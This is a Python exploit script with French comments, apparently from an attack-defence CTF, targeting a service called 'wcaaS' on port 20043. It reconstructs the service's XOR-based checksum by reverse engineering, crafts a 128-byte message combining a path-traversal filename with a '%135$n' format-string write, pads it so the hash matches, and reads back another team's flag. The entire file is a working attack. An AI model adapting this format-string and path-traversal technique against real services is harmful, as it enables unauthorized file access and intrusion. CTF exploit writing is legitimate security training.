#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
import time

if len(sys.argv) != 3 :
    print("Exploit du service wcaaS\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20043

# "Clé" utilisée plus loin lors du calcul du XOR
xor_key = "\xC7"
xor_seed = 199
for i in range(1,128) :
  xor_seed = (xor_seed * 7) % 256
  xor_key += chr(xor_seed)

# Seuls les 8 derniers caractères ont une influence sur le hash final
# Pour ces caractères, on les XOR d'abord avec la clé précédente obtenue par reverse-engineering
def xored_message(message) :
  xored_result = 'A'*120
  if len(message) != 128 :
    print("Le message n'a pas la bonne longueur !")
  else :
    for i in range(120,128) :
      xored_result += chr(ord(message[i]) ^ ord(xor_key[i]))
  return xored_result

# Retourne le "hash" calculé par crossum dans le service
# La formule mathématique utilisée est déterminée par reverse-engineering
def hash_function(message) :
  xored = xored_message(message)
  hash_result = 0
  n = 1
  modulo = 2**32
  for i in range(127, 119, -1) :
    if i != 127 :
      n = (n * 272) % modulo  
    hash_result += ord(xored[i]) * n
  return (hash_result % modulo)


target = '.'  + (9 - len(target))*'/' + target

msg_hashing_to_target_length = xored_message('\x00'*127+chr(len(target)))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

try :
  time.sleep(0.1)
  ack = s.recv(4096)

# Il faut se débarasser de %135 pour l'ouverture du fichier...
# Regarder sur le serveur comment sont stockés les fichiers, et surtout le début ??
  format_string = '%135$n'

  message_payload = target + format_string
  message_padding = '\x00'*(128-len(message_payload)-8) + msg_hashing_to_target_length[120:]
  message = message_payload + message_padding

  s.send(message)
  time.sleep(0.2)
  ack = s.recv(999999)
  flag = ack.split()[2]
  print(flag)


except socket.error:
  print("Erreur lors de l'envoi")
  sys.exit()
